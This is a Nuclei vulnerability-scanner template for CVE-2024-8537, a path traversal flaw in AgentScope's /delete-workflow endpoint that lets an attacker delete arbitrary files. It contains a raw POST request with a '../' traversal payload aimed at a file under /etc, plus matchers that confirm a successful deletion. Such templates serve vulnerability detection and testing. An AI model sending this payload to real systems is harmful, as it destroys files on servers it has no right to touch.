id: CVE-2024-8537

info:
  name: AgentScope - Arbitrary File Delete
  author: gy741
  severity: critical
  description: |
    The agentscope application is vulnerable to a path traversal vulnerability in /delete-workflow endpoint that allows any attacker to be able to delete arbitrary files from the filesystem .
  impact: |
    The vulnerability allows for path traversal, enabling an attacker to delete arbitrary files on the affected system. By exploiting improper input validation or insufficient access controls, the attacker can manipulate file paths to delete sensitive files outside of the intended directory.
  reference:
    - https://huntr.com/bounties/eeb8aa4b-e6e5-465c-b0dd-aa97e3b7dc09
    - https://nvd.nist.gov/vuln/detail/CVE-2024-8537
  tags: cve2024,cve,agentscope,oss,lfi,huntr,lfprojects

http:
  - raw:
      - |
        POST /delete-workflow HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"filename":"../../../../../../../../../../../../../../../../../etc/passwwd"}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'Workflow file deleted successfully'

      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - 'application/json'
